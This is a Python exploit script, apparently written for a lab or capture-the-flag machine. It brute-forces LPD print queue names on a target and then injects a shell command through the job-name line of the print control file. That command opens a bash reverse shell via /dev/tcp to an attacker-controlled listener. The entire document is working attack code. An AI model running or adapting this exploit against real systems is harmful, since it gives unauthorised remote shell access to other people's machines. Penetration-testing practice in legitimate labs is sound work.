import socket
import sys
import time

def try_queue(target_ip, target_port, queue_name, lhost, lport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2) # Short timeout for queue rejection
    try:
        s.connect((target_ip, target_port))
    except Exception as e:
        return False, f"Connection failed: {e}"

    # 1. Send Print Job command (\x02) + queue name
    s.send(bytes([2]) + queue_name.encode() + b"\n")

    # Check for rejection (\x01) or timeout (which means accepted!)
    try:
        resp = s.recv(1024)
        if b'\x01' in resp:
            s.close()
            return False, "Rejected"
        elif not resp:
            s.close()
            return False, "No response"
    except socket.timeout:
        # A timeout here is GOOD. It means the server didn't reject us 
        # and is now waiting for us to send the print job chunk!
        pass 

    print(f"\n[+] SUCCESS: Queue '{queue_name}' accepted!")
    
    # Increase timeout for the rest of the exploit
    s.settimeout(5)
    
    # 2. Construct the payload
    payload = f"x'; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'; echo '"
    content = f"J{payload}\n".encode()
    
    # 3. Construct the chunk header
    chunk_header = bytes([2]) + str(len(content)).encode() + b" cfA001\n"
    
    # Send the header
    s.send(chunk_header)
    
    # Wait for the server to acknowledge the header
    try:
        s.recv(1024)
    except:
        pass

    # Send the malicious content
    s.send(content)
    
    print("[*] Payload sent! Check your netcat listener.")
    
    # Keep connection open briefly for the server to process
    time.sleep(3)
    s.close()
    return True, "Payload sent"

if __name__ == "__main__":
    TARGET = "10.129.130.130"
    PORT = 1515
    LHOST = "10.10.15.149"  # Make sure this is your Kali VPN IP
    LPORT = 9001

    # Common queue names to brute-force
    queues_to_try = [
        "lp", "print", "printer", "pdf", "archive", "default", 
        "zebra", "raw", "test", "queue", "local", "parallel", 
        "serial", "usb", "cups", "hp", "canon", "xerox", "epson"
    ]

    print(f"[*] Starting LPD Queue Brute-Force against {TARGET}:{PORT}")
    
    for q in queues_to_try:
        print(f"[*] Trying queue: {q}...", end=" ")
        success, msg = try_queue(TARGET, PORT, q, LHOST, LPORT)
        
        if success:
            print("Accepted!")
            break # Stop trying once we find the right queue and send the payload
        else:
            print(msg)
        
        time.sleep(0.5) # Small delay between attempts